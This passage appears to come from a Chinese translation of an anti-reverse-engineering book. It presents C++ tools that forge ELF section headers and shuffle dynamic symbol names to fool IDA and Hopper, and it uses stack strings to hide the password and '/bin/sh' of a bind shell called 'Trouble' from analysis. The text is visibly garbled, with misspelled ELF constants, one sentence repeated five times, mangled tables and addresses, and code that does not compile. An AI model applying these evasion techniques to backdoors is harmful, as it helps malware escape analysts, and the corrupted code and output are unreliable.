    Elf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);
    Elf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[0] + ehdr->e_phoff);

    for (int i = 0; i < ehdr->e_phnum; i++, phdr++)
    {
        if (phdr->p_type == PT_LOAD)
        {
            Elf64_Shdr text_header = {};
            text_header.sh_name = p_strings.size();
            text_header.sh_type = SHT_PROBITS;
            text_header.sh_flags = SHF_ALLOC | SHF_WRITE;
            text_header.sh_addr = phdr->p_vaddr;
            text_header.sh_offset = phdr->p_offset;
            text_header.sh_size = phdr->p_filesz;
            text_header.sh_link = 0;
            text_header.sh_info = 0;
            text_header.sh_adalign = 4;
            text_header.sh_entsize = 0;
            p_strings.append(".data");
            p_strings.push_back('\x00');
            p_data.append(reinterpret_cast<const char*>(&text_header), sizeof(text_header));
            return true;
        }
    }
    return false;
}
```

```cpp
/*
* 创建一个伪造节表并将字符串附加到文件末尾
* @param[in,out] p_data ELF 二进制文件
* @return 成功返回 true，否则返回 false
*/
```

```cpp
bool append_sections(std::string& p_data)
{
    // strings 将包含节名称
    std::string strings;
    strings.push_back('\x00');
    // 第一条目是空的
    Elf64_shdr null_header = {};
    p_data.append(reinterpret_cast<char*>(&null_header), sizeof(null_header));

    if (!add_data_section(p_data, strings)) {
        std::cerr << "未找到执行段" << std::endl;
        return false;
    }

    if (!add_text_section(p_data, strings)) {
        std::cerr << "未找到写段" << std::endl;
        return false;
    }

    // .shstrtab
    Elf64_shdr strtab = {};
    strtab.sh_name = strings.size();
    strtab.sh_type = SHT_STRTAB;
    strtab.sh_flags = 0;
    strtab.sh_addr = 0;
    strtab.sh_offset = p_data.size() + sizeof(Elf64_shdr);
    strtab.sh_size = 0;
    strtab.sh_link = 0;
    strtab.sh_info = 0;
    strtab.sh_align = 4;
    strtab.sh_entsize = 0;
    strings.append(".shstrtab");
    strings.push_back('\x00');
    strtab.sh_size = strings.size();
    p_data.append(reinterpret_cast<char*>(&strtab), sizeof(strtab));
    p_data.append(strings);
    return true;
}

int main(int argc, char** argv)
{
    if (argc != 2) {
        std::cerr << "用法: ./HeadersHideEntry <文件路径>" << std::endl;
        return EXIT_FAILURE;
    }

    std::ifstream inputFile(argv[1], std::ifstream::binary);
    if (!inputFile.is_open() || !inputFile.good()) {
        std::cerr << "无法打开文件: " << argv[1] << std::endl;
        return EXIT_FAILURE;
    }

    std::string input((std::istream_iterator<char>(inputFile), std::istreambuf_iterator<char>());
    inputFile.close();

    if (!edit_elf_header(input)) {
        return EXIT_FAILURE;
    }

    if (!append_sections(input)) {
        return EXIT_FAILURE;
    }

    std::ofstream outputFile(argv[1], std::ofstream::out | std::ofstream::binary);
    if (!outputFile.is_open() || !outputFile.good()) {
        std::cerr << "无法写入文件: " << argv[1] << std::endl;
        return EXIT_FAILURE;
    }

    outputFile.write(input.data(), input.length());
    outputFile.close();
    return EXIT_SUCCESS;
}
```

像之前一样，使用 CMake 编译项目。

## 编译 fakeHeadersEntry

```bash
albino-lobster@ubuntu:~/antire_book$ cd chap_3_format_hacks/fakeHeadersEntry/
albino-lobster@ubuntu:~/antire_book$ mkdir build
albino-lobster@ubuntu:~/antire_book$ chap_3_format_hacks/fakeHeadersEntry$ cd build/
albino-lobster@ubuntu:~/antire_book$ chap_3_format_hacks/fakeHeadersEntry$ cd ..
```

- C++ 编译器识别为 GNU 5.4.0
- 检查可用的 C++ 编译器: `/usr/bin/c++`
- 检查可用的 C++ 编译器: `/usr/bin/c++` 可
- 检测 C++ 编译器 ABI 信息 - 完成
- 检测 C++ 编译器 ABI 信息
- 检测 C++ 编译特征
- 检测 C++ 编译特征 - 完成
- 正在配置
- 生成完成
- 构建文件已写入: `/home/albino-lobster/antire_book/chap_3_format_hacks/make/fakeHeadersEntry/build`

```bash
albino-lobster@ubuntu:~/antire_book$ chap_3_format_hacks/fakeHeadersEntry$ build$ \
扫描目标 fakeHeadersEntry 的依赖关系
- [50%] 编译 C++ 对象 CMakeFiles/fakeHeadersEntry.dir/src/fakeHeadersEntry/main.cpp.o
- [100%] 编译 C++ 可执行文件 fakeHeadersEntry
- [100%] make fakeHeadersEntry
```

重新编译 Trouble 并使用 stripBinary 移除节头。接下来使用 fakeHeadersEntry 附加伪造的节表。

## 在 Trouble 上使用 fakeHeadersEntry

```bash
albino-lobster@ubuntu:~/antire_book$ chap_3_format_hacks/fakeHeadersEntry$build$ \
./fakeHeadersHideEntry ~/antire_book/chap_3_format_hacks/trouble/build/trouble
```

输出并不令人兴奋，但让我们用 radare 查看 Trouble。

## 第 3 章：格式破解技巧

### 使用 radare 检查 Trouble

输出并不令人兴奋，但让我们用 radare 查看 Trouble。

输出并不令人兴奋，但让我们用 radare 查看 Trouble。

输出并不令人兴奋，但让我们用 radare 查看 Trouble。

输出并不令人兴奋，但让我们用 radare 查看 Trouble。

输出并不令人兴奋，但让我们用 radare 查看 Trouble。

# 第 3 章：文件格式技巧

这种混淆技术对 Radare2 无影响。这进一步证实了即使在存在节头部的情况下，Radare2 也倾向于使用程序头中的信息。让我们与 IDA 进行对比。以下是 IDA 对入口点的反汇编代码。

## 在 IDA 中检查 fakeHeadersHideHideEntry 的问题

```text
.text:00000000040002F2 public start
.text:00000000040002F2 start proc near
.text:00000000040002F2
.text:00000000040002F2 arg_40 = qword ptr 48h
.text:00000000040002F2
.text:00000000040002F2 ; FUNCTION CHUNK AT .text:000000000400201E SIZE 000001D BYTES
.text:00000000040002F2
.text:00000000040002F2 add [rbp+1], bh
.text:00000000040002F8 call sub_400990
.text:00000000040002FD jump loc_40021E
.text:0000000004000302
.text:0000000004000302
.text:0000000004000302 loc_400382; ; CODE XREF:start-C4 j
.text:0000000004000302 call sub_40061B
.text:0000000004000307
.text:0000000004000307 xor rbp, rbp
.text:000000000400030A mov r9, rdx
.text:000000000400030D pop r
.text:000000000400030E mov rdx, rsp
.text:0000000004000311 and rsp, 0xFFFFFFFFFFFFFF0
.text:0000000004000315 mov r8, (offset loc_40139B+4)
.text:000000000400031C mov rcx, 400120h
.text:0000000004000323 mov rdi, offset byte_400130
.text:000000000400032A call sub_40057B
.text:000000000400032F ;
.text:000000000400032F
.text:000000000400032F loc_40032F; ; CODE XREF:start:loc_40032F j
.text:000000000400032F jump short loc_40032F
.text:000000000400032F start endp; sp-analysis failed
```

将此反汇编与 Radare2 的反汇编进行比较。IDA 的反汇编显然是错误的。它表明 IDA 倾向于使用节头部而不是程序头。

最后，让我们看看 Hopper 如何处理这种混淆技术。

## 在 Hopper 中检查 fakeHeadersHideEntry 的问题

```text
EntryPoint:
00000000040002f2 xor rbp, rbp
00000000040002f5 mov r9, rdx
00000000040002f8 pop rsi      ; argument #2 for method sub_400566
00000000040002f9 mov rdx, rsp      ; argument #3 for method sub_400566
00000000040002fc and rsp, 0xffffffffff0
0000000004000300 mov rbp, 0x40139f
0000000004000307 mov rcx, 0x40120
000000000400030e mov rdi, 0x40130      ; argument #1 for method sub_400566
0000000004000315 call   sub_400566
000000000400031a jmp     0x4031a      ; XREF=EntryPoint+40
endp
```



你可以看到 `Hopper` 和 `Radare2` 一样也能正确反汇编入口点。看来这个技巧只对 `IDA` 有用，但它仍然是我们工具箱中非常有用的工具。

### 混合符号

到目前为止，强调了静态编译的文件格式技巧。然而，本节将讨论一种要求存在符号表的反逆工程技术。我首先在 `Andrewlowski` 写的博客中看到了这种。在这种技术中，你将在文件末尾添加一个伪符号表。然后你将 `.dynsym` 头部中的偏移指向伪符号表。最后，你将混合所有符号指针。这会导致依赖程序头内节部的反汇编器显示错误的函数名。我写了一个工具来混合动态符号。你可以在 `mixSymbols` 目录下找到它。有两个文件：`CMakeLists.txt` 和 `mixSymbols.cpp`。

### 第 3 章：文件格式技巧

### `CMakeLists.txt`

```cmake
project(mixSymbols CXX)

cmake_minimum_required(VERSION 3.0)

set(CMAKE_CXX_FLAGS "-Wall -Wextra -shadow")

add_executable(${PROJECT_NAME} src/mixSymbols.cpp)
```

### `mixSymbols.cpp`

```cpp
#include <cstdlib>

#include <iostream>

#include <fstream>

#include <iomanip>

#include <cstring>

#include <elf.h>

#include <vector>
```

- 此工具接收带有节表的 ELF 二进制文件并使用动态链接并在末尾附加伪符号表。然后伪符号表中的符号名称被混合。这会导致反汇编器过度信任节部（像 `IDA` 一样），在反汇编中显示错误的符号名称。
- 在节表中找到 `SHT_DYMTAB`，将偏移指向文件末尾，并将动态符号表复制到文件末尾。然后遍历新 `dynsym` 中的符号并更改所有名称偏移。
- `@param[in,out] p_data` 要修改的 ELF 二进制文件
- `@return` 如果没有遇到错误返回 `true`，否则 `false`

```cpp
bool append_dynsym(std::string& p_data) {

    if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' || p_data[3] != 'F') {

        std::cerr << "Bad magic." << std::endl;

        return false;

    }

    Elf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(p_data[0]);

    if (ehdr->e_shoff == 0) {

        std::cerr << "The binary has no sections table" << std::endl;

        return false;

    }

    if (ehdr->e_shsize != sizeof(Elf64_Shdr)) {

        std::cerr << "Unexpected section header size" << std::endl;

        return false;

    }

    // 遍历节直到遇到 .dynsym

    Elf64_Shdr* shdr = reinterpret_cast<Elf64_Shdr*>(p_data[0] + ehdr->e_shoff);

    for (int i = 0; i < ehdr->e_shnum; i++, shdr++) {

        if (shdr->sh_type == SHT_DYMTAB) {

            std::size_t offset = shdr->sh_offset;

            // 将偏移重指向到文件末尾

            shdr->sh_offset = p_data.size();

            // 将 dynsym 拷贝到文件末尾

            p_data.append(p_data.data() + offset, shdr->sh_size);

            // 收集所有偏移

            std::vector<int> name_offsets;

            std::vector<Elf64_Sym> symbols;

            Elf64_Sym* symbol = reinterpret_cast<Elf64_Sym*>(p_data[0] + shdr->sh_offset);

            for (int i = 0; reinterpret_cast<char*>(symbol) < p_data.data() + p_data.size(); ++symbol) {

                if (ELF64_STYPE(symbol->st_info) == STT_FUNC &&

                    ELF64_BIND(symbol->st_info) == STDT_GLOBAL) {

                    symbols.push_back(*symbol);

                    // ... (此处逻辑根据输入截断)
```

提供的文本结束于：
`if (ELF64_STYPE(symbol->st_info) == STT_FUNC &&`
`ELF64_BIND(symbol->st_info) == STDT_GLOBAL)`

# 第 3 章：文件格式技巧

`mixDynamicSymbols` 必须在具有动态符号的二进制文件上使用。出于如此，请回到第一章版本的 `Trouble`。在对 `Trouble` 使用 `mixDynamicSymbols` 之前，让我们快速查看一下 `.dynym` 节表头（输出已截断以关注 `.dynym`）。

## `Trouble` 的 `.dynym` 节表头

```bash
albino-lobster@ubuntu:-/antire_book/chap_1_introduction/trouble/build$ reread -S ~/t/trouble

有 36 个节表头，从偏移量 0x3c40 开始：

Section Headers:

| [Nr] | Name | Address | Offset | Size | EntSize | Flags | Link | Info | Align |

| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |

| [ 5 ] | .dynym | 0000000000000003 | 48 | 0000000000000001 | A | 6 | 1 | 8 |
```

重要的是，注意偏移量是 `0x300`。此外，查看动态符号表以看看它将发生什么变化。

## 混合符号之前的 `Trouble` `.dynym`

```bash
albino-lobster@ubuntu:-/antire_book/chap_1_introduction/trouble/build$ reread --dynym/.symbol

符号表 '.dynym' 包含 35 条目：

| Num | Value | Type | Bind | Vis | Ndx | Name |

| :--- | :--- | :--- | :--- | :--- | :--- | :--- |

| 0 | 0000000000000000 | NOTYPE | LOCAL | DEFAULT | UND | |

| 1 | 0000000000000000 | WEAK | GLOBAL | DEFAULT | UND | __ITM_deregisterTcloneTab |

| 2 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | accept@GLIBC_2.2 (3) |

| 3 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | memcmp@GLIBC_2.2 (3) |

| 4 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | perror@GLIBC_2.2 (3) |

| 5 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | htoml@GLIBC_2.2 (3) |

| 6 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | close@GLIBC_2.2 (3) |

| 7 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | fork@GLIBC_2.2 (3) |

| 8 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | bind@GLIBC_2.2 (3) |

| 9 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | read@GLIBC_2.2 (3) |

| 10 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | fwrite@GLIBC_2.2 (3) |

| 11 | 0000000000000000 | NOTYPE | WEAK | DEFAULT | UND | __gmon_start |

| 12 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | execve@GLIBC_2.2 (3) |

| 13 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | htons@GLIBC_2.2 (3) |

| 14 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | listen@GLIBC_2.2 (3) |

| 15 | 0000000000000000 | NOTYPE | WEAK | DEFAULT | UND | _Jv_RegisterClasses |

| 16 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | dup2@GLIBC_2.5 (3) |

| 17 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | socket@GLIBC_2.2 (3) |

| 18 | 0000000000000000 | NOTYPE | WEAK | DEFAULT | UND | _ITM_registerTCloneTable |

| 19 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | __libc_start_main@GLIBC_2.5 (3) |

| 20 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | _stack_chk_fail@GLIBC_2.2 (3) |

| 21 | 000000000000620a8 | NOTYPE | GLOBAL | DEFAULT | 25 | _edata |

| 22 | 000000000000620b6 | NOTYPE | GLOBAL | DEFAULT | 25 | _start_data |

| 23 | 000000000000620d8 | NOTYPE | GLOBAL | DEFAULT | 26 | _end |

| 24 | 000000000000040c6 | FUNC | GLOBAL | DEFAULT | 14 | check_password |

| 25 | 00000000000062098 | NOTYPE | WEAK | DEFAULT | 25 | _data_start |

| 26 | 000000000000040e0 | OBJECT | GLOBAL | DEFAULT | 16 | _IO_stdin_used |

| 27 | 000000000000040e6 | FUNC | GLOBAL | DEFAULT | 14 | __libc_csu_init |

| 28 | 00000000000004b10 | FUNC | GLOBAL | DEFAULT | 101 | _start |

| 29 | 000000000000620a8 | NOTYPE | GLOBAL | DEFAULT | 26 | _bss_start |

| 30 | 000000000000040c2f | FUNC | GLOBAL | DEFAULT | 558 | main |

| 31 | 000000000000049d0 | FUNC | GLOBAL | DEFAULT | 11 | _init |

| 32 | 000000000000620c0 | OBJECT | GLOBAL | DEFAULT | 26 | stderr@GLIBC_2.2.5 (3) |

| 33 | 000000000000040ed0 | FUNC | GLOBAL | DEFAULT | 14 | __libc_csu_fini |

| 34 | 000000000000040ed4 | FUNC | GLOBAL | DEFAULT | 15 | _fini |
```

现在对 `Trouble` 使用 `mixDynamicSymbols`。

正在对 `Trouble` 应用 `mixDynamicSymbols`

```bash
albino-lobster@ubuntu:-/antire_book/chap_3_format_hacks/mixDynamicSymbols/build$ ../../antire_book/chap_1_introduction/trouble/trouble

albino-lobster@ubuntu:-/antire_book/chap_3_format_hacks/mixDynamicSymbols/build$
```

没有特殊的输出，但现在看看 `.dynsym` 节头。

## 第 3 章：文件格式

### `Trouble` 的 `.dynym`

```bash
albino-lobster@ubuntu:-/antire_book/chap_1_introduction/trouble/build$ readelf -S /trouble

有 36 个节表头，从偏移量 0x3c40 开始：

### Section Headers:

| Nr | Name | Type | Address | Offset | Size | EntSize | Flags | Link | Info | Align |

| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |

| 5 | .dynym | DYNSYM | 0000000000000348 | 0000000000000018 | A | 6 | 1 | 8 |
```

偏移量不再指向 `0x300`，而是指向我们复制到 `0x4540` 的伪符号表。看看动态符号表的变化。

## `Trouble` 混合后的 `.dynsym`

```bash
albino-lobster@ubuntu:-/antire_book/chap_1_introduction/trouble/build$ readelf --sym ./trouble

符号表 '.dynsym' 包含 25 条目:

| Num | Size | Type | Bind | Vis | Ndx | Name |

| :--- | :--- | :--- | :--- | :--- | :--- | :--- |

| 0 | 0000000000000000 | NOTYPE | LOCAL | DEFAULT | UND | |

| 1 | 0000000000000000 | NOTYPE | WEAK | DEFAULT | UND | _ITM_deregisterTClone |

| 2 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | memcmp_GLIBC_2.2 (3) |

| 3 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | fwrite_GLIBC_2.2.5 (3) |

| 4 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | __libc_start_main_GLIBC_2.2_ |

| 5 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | accept_GLIBC_2.2.5 (3) |

| 6 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | socket_GLIBC_2.2.5 (3) |

| 7 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | close_GLIBC_2.2.5 (3) |
```



| 8 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | `perror_GLIBC_2.2.5` (3) |
| 9 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | `bind_GLIBC_2.2.5` (3) |
| 10 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | `_stack_chk_fail_GLIBC_2.2_` |
| 11 | 0000000000000000 | NOTYPE | WEAK | DEFAULT | UND | `__gm_start_` |
| 12 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | `execve_GLIBC_2.2.5` (3) |
| 13 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | `htonl_GLIBC_2.2.5` (3) |
| 14 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | `dup2_GLIBC_2.2.5` (3) |
| 15 | 0000000000000000 | NOTYPE | WEAK | DEFAULT | UND | `_Jv_RegisterClasses` |
| 16 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | `fork_GLIBC_2.2.5` (3) |
| 17 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | `listen_GLIBC_2.2.5` (3) |
| 18 | 0000000000000000 | NOTYPE | WEAK | DEFAULT | UND | `_ITM_registerTCloneTable` |
| 19 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | `read_GLIBC_2.2.5` (3) |
| 20 | 0000000000000000 | FUNC | GLOBAL | DEFAULT | UND | `htons_GLIBC_2.2.5` (3) |
| 21 | 000000000000620a8 | NOTYPE | GLOBAL | DEFAULT | 25 | `_edata` |
| 22 | 000000000000620fb | NOTYPE | GLOBAL | DEFAULT | 25 | `__data_start` |
| 23 | 000000000000620d0 | NOTYPE | GLOBAL | DEFAULT | 26 | `_end` |
| 24 | 000000000000040c6 | FUNC | GLOBAL | DEFAULT | 14 | `check_password` |
| 25 | 00000000000062098 | NOTYPE | WEAK | DEFAULT | 25 | `_data_start` |

## 第 3 章：文件格式技巧

```
.text:000000000400C2E check_password endp
.text:000000000400C2E
```

注意 `0x400c23` 处的调用显示为 `*_bind()();*`。那应该是 `memcmp`。这种技术的巧妙之处不应被低估。逆向工程工程师只有在进行动态分析，或者对比段（section）和程序头（program headers）中的 `.dysym` 偏移时，才会注意到符号名称是不正确的。遗憾的是，Radare2 再次对这种混淆技术产生了免疫。

Radare2 仍然显示 `memcmp`

```
albino-lobuster@~/binary-book/chap_1_introduction/trouble/build$ radare2 ./
-- 这是一个不可接受的百万迷宫。
[0x400b10]> aaa
[x] Analyze all flags starting with may. and entry(aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] [* -AA or aaaa for additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
[0x400b10]> pdf @ sym.check_password
/ (fcn) sym.check_password 41
|   sym.check_password ()
|   |   var int local_8h @ rbp-0x8
|   |   CALL XREF from 0x04000dc3 (sym.main)
  0x40000c6 55              push rsp
  0x40000c7 4889e5        mov rsp, rsp
  0x40000c0 4883c10       sub rsp, 0x10
  0x40000ce 4879d8f       mov qword [rbp] - local_8h], edi
  0x40000d12 484b48f5      mov eax, qword [rbp] - local_8h]
  0x40000d16 ba200000    mov edx, 0x20
  0x40000d1b 4889c6        mov esi, rax
  0x40000d1e bf00f400      mov edi, str.GisUtI89aMRJKvkz31NuXtq9155kE
Ega: "GisUtI89aMRJKvkz31NuXtq9155kE" @ 0x4000f00
  0x40000d23 e48ffff      call sym.imp.memcmp
  0x40000d28 85c0            test eax, eax
  0x40000d2a 09c0            setne al
  0x40000d2c c9               leave
  0x40000d2e c3               ret
[0x400b10]>
```

有趣的是，虽然 Hopper 正确处理了其他一些文件格式混淆，但它对这种特定攻击失效了。

Hopper 中带有混合动态符号的 `check_password()`

```
check_password:
00000000040000c6    push   rbp                ; XREF=main+404
00000000040000c7    mov    rbp, rsp
00000000040000ca    sub    rsp, 0x10
00000000040000ce    mov    qword [ss:rbp+var_8], rdi
00000000040000d2    mov    rax, [ss:rbp+var_8]
00000000040000d6    mov     edx, 0x20       ; 方法 j_bind 的参数 "address_len"
00000000040000d0    mov     rsi, rax        ; 方法 j_bind 的参数 "address"
00000000040000d4    mov     edi, 0x400f00      ; "GisFutI89aMRJKvkz31NuXtq9155kEGa", 参数
ent"socket" 方法 j_bind 的参数
00000000040000c3    call   j_bind
0000000004000028    test   eax, eax
000000000400002a    setne  al
000000000400002d    leave
000000000400002e    ret
    endp
```

## 第 4 章：对抗字符串分析

在之前的章节中，我们花费了大量精力防止逆向工程师破解 **Trouble** 绑定 shell（bind shell）的密码。然而，我们还没有保护二进制文件免受逆向工程师工具箱中首选工具之一：`strings`。看看发现密码是多么简单。

在 `strings` 输出中找到密码

```
albino-lobster@~/binary-book/chap_3_hacks/trouble/build$ strings -a -n 32 .trouble
GisUt89aMRvkz31NuXtq155kE 临时不可用
不支持协议
关闭后无法发送
```

在此 **Trouble** 构建中，密码是 `GisUt89aMRvkz31NuXtq155kE`，它正好是 `strings` 输出中的第一项。

### 代码重构

现在是时候改变 Trouble 的编译方式了。你学习了一些有趣的混淆技术，我想在书剩下的部分保留其中一些。在上一章中，你必须手动运行 `strip`，但这很麻烦。相反，让我们自动化。在第 4 章中，我们将使用 "dontpanic" 目录下的 `CMakeLists.txt` 文件编译 Trouble。之后你将看到如何通过运行 `cmake ..; make` 轻松地向 "dontpanic" 添加其他项目。目前第 4 章编译 Trouble 应该是这样的：`strings` 是一个输出文件中所有字符串的简单实用程序。详情见 "man strings"。

编译 Trouble 的版本

```
albino-lobster@~/binary-book$ cd chap_4_static_analysis/dontpanic/
albino-lobster@~/binary-book/chap_4_static_analysis/dontpanic$ mkdir build
albino-lobster@~/binary-book/chap_4_static_analysis/dontpanic$ cd build
-- C 编译器识别为 GNU 5.4.0
-- 检查工作的 C 编译器: /usr/bin/cc
-- 检查工作的 C 编译器: /usr/bin/cc
-- 正在检测 C 编译器 ABI
-- C 编译器 ABI 检测完成
-- 正在检测 C 编译器特性
-- C 编译器特性检测完成
-- 配置完成
-- 生成完成
-- 构建文件已写入：/home/albino-lobster_binary_book/chap_4_static_analysis/dontpanic/build
albino-lobster@~/binary-book/chap_4_static_analysis/dontpanic$ make
扫描目标 trouble 的依赖关系
[33%] 正在编译 CMakeFiles.dir/src/trouble.c.o
[66%] 正在编译 CMakeFiles.dir/src/rc4.c.o
[100%] 链接可执行文件 trouble
[100%] 构建目标 trouble
绑定 shell 密码为：HgAtD6Qfwb0so1M7WM
albino-lobster@~/binary-book/chap_4_static_analysis/dontpanic/build$
```

不仅所有项目都编译了，`strip` 和伪头部还自动应用于 Trouble。现在可以在 `build` 子目录中找到绑定 shell。

### 栈字符串

隐藏字符串的方法之一是将字符串与代码混合。这是栈字符串（stack string）的基本思想。目标是将字符串的每个字节一次添加到栈中。例如，考虑 Trouble 中的字符串 `"/bin/sh"`。目前，字符串如下方式用于 `execve`：

`execve("/bin/sh", empty, empty);`

字符串也出现在 `strings` 输出中

在 Trouble 的字符串输出中找到 `/bin/sh`

```
albino-lobster@~/binary-book/chap_4_static_analysis/dontpanic/build$ strings -a .trouble | grep "/bin/sh"
/bin/sh
```

你可以进行简单的更改，确保 `"/bin/sh"` 字符串在栈上构建，并且不会出现在 `strings` 输出中。

更改 Trouble 声明 `/bin/sh` 以使 `strings` 无法找到。

```c
char binsh[] = { '/', 'b', 'i', 'n', '/', 's', 'h', 0 };
execve(binsh, empty, empty);
```

现在 `strings` 无法找到 `"/bin/sh"` 了。

在 `strings` 输出中搜索 `/bin/sh`

```
albino-lobster@~/binary-book/chap_4_static_analysis/dontpanic/build$ strings -a .trouble/trouble | grep "/bin/sh"
albino-lobster@~/binary-book/chap_4_static_analysis/dontpanic/build$
```

为什么这有效？考虑在栈字符串更改之前 `execve()` 附近的反汇编代码。

使用普通 `/bin/sh` 的反汇编

```
.text:0000000004005753    mov [rbp+var_50], 0
.text:000000000400575B    lea rdx, [rbp+var_50]
.text:000000000400575F    lea rax, [rbp+var_50]
.text:0000000004005783    mov rsi, rax
.text:0000000004005786    mov edi, offset aBin ; "/bin/sh"
.text:000000000400578B    call execve
```

如你所见，在调用之前 `"/bin/sh"` 的地址存储在 `edi` 中。

使用栈字符串的反汇编

```
.text:000000000400575F    mov [rbp+var_68], 0
.text:0000000004005763    mov [rbp+var_67], 0x2f
.text:0000000004005767    mov [rbp+var_66], 0x62
.text:00000000040056B    mov [rbp+var_65], 0x69
.text:000000000400576F    mov [rbp+var_64], 0x6e
.text:0000000004005773    mov [rbp+var_63], 0x2f
.text:0000000004005777    mov [rbp+var_62], 0x73
.text:000000000400577B    mov [rbp+var_61], 0x68
.text:000000000400577F    mov [rbp+var_60], 0
.text:0000000004005783    lea rdx, [rbp+var_60]
.text:0000000004005787    lea rax, [rbp+var_60]
.text:000000000400578B    mov rsi, rcx
.text:000000000400578F    mov edi, rax
.text:0000000004005793    call execve
```

上面你可以看到每个字母都是一次一个字节地添加到栈中。这有效地将字符串与代码混合，使得 `strings` 工具无法轻易找到它。

## 第4章：对抗字符串分析

将文本字符串实现为单个字符的数组是非常有用的，但我们如何让它适用于 Trouble 的 shell 密码呢？记住，每当运行 `cmake` 命令时，你都会生成一个新的密码，并将生成的密码作为宏传递给 Trouble。该宏仅仅是一个字符串。这意味着我们应该像往常一样对它进行索引，并让编译器完成其余工作。例如，你可以将 `check_password()` 函数修改如下：

将密码存储为栈上字符串

```c
bool check_password(const char* p_password)
{
    char password[33] =
        password[0], password[1], password[2], password[3], password[4],
        password[5], password[6], password[7], password[8], password[9],
        password[10], password[11], password[12], password[13], password[14],
        password[15], password[16], password[17], password[18], password[19],
        password[20], password[21], password[22], password[23], password[24],
        password[25], password[26], password[27], password[28], password[29],
        password[30], password[31], 0;
```



## 第4章：对抗字符串分析

最后，为了验证我们的字符串代码是否有效，请查看`strings`的输出。密码不再出现在`strings`的输出中。

```bash
$ strings -a 32 ./trouble
Resource temporarily unavailable
Address not supported by protocol
Cannot send after shutdown
```

在上一节中，你让`Trouble`的shell密码变成了栈上字符串。然而，密码仍然很容易从`strings`工具中恢复。

以栈上字符串存储密码的`check_password()`反汇编代码：

```assembly
.text:00000000004003f0                public check_password
.text:00000000004003f0 check_password      proc near        ; CODE REF:main+13d
.text:00000000004003f0                sub     rsp, 38h
.text:00000000004003f4                mov     rsi, rdi
.text:00000000004003f7                mov     edx, 20h
.text:00000000004003fc                mov     rdi, rsp
.text:00000000004003ff                mov     [rsp+38h+var_38], 40h
.text:0000000000400403                mov     [rsp+38h+var_37], 49h
.text:0000000000400408                mov     rax, fs:28h
.text:0000000000400411                mov     [rsp+38h+var_10], rax
.text:0000000000400016 xor eax, eax
.text:0000000000040018 mov    [rsp+38h+var_36], 6Bh
.text:000000000004001D mov    [rsp+38h+var_35], 4Bh
.text:0000000000040022 mov    [rsp+38h+var_34], 39h
.text:0000000000040027 mov    [rsp+38h+var_33], 61Bh
.text:000000000004002C mov    [rsp+38h+var_32], 63Bh
.text:0000000000040031 mov    [rsp+38h+var_31], 58h
.text:0000000000040036 mov    [rsp+38h+var_30], 33h
.text:000000000004003B mov    [rsp+38h+var_2F], 37h
.text:0000000000040040 mov    [rsp+38h+var_2E], 79h
.text:0000000000040045 mov    [rsp+38h+var_2D], 7Dh
.text:000000000004004A mov    [rsp+38h+var_2C], 5Ah
.text:000000000004004F mov    [rsp+38h+var_2B], 44h
.text:0000000000040054 mov    [rsp+38h+var_2A], 51h
.text:0000000000040059 mov    [rsp+38h+var_29], 46h
.text:000000000004005E mov    [rsp+38h+var_28], 75h
.text:0000000000040063 mov    [rsp+38h+var_27], 76h
.text:0000000000040068 mov    [rsp+38h+var_26], 27h
.text:000000000004006D mov    [rsp+38h+var_25], 4Bh
.text:0000000000040072 mov    [rsp+38h+var_24], 48h
.text:0000000000040077 mov    [rsp+38h+var_23], 33h
.text:000000000004007C mov    [rsp+38h+var_22], 48h
.text:0000000000040081 mov    [rsp+38h+var_21], 33h
.text:0000000000040086 mov    [rsp+38h+var_20], 75h
.text:000000000004008B mov    [rsp+38h+var_1F], 52h
.text:0000000000040090 mov    [rsp+38h+var_1E], 78h
.text:0000000000040095 mov    [rsp+38h+var_1D], 4Bh
.text:000000000004009A mov    [rsp+38h+var_1C], 5Ch
.text:000000000004009F mov    [rsp+38h+var_1B], 4Bh
.text:00000000000400A4 mov    [rsp+38h+var_1A], 70h
.text:00000000000400A9 mov    [rsp+38h+var_19], 48h
.text:00000000000400AE mov    [rsp+38h+var_18], 0
.text:00000000000400B3 call   memcmp
.text:0000000000040BB8 test    eax, eax
.text:0000000000040BBA setz    al
.text:00000000000400C2 mov    rcx, [rsp+38h+var_10]
.text:00000000000400CD xor     rcx, fs:28h
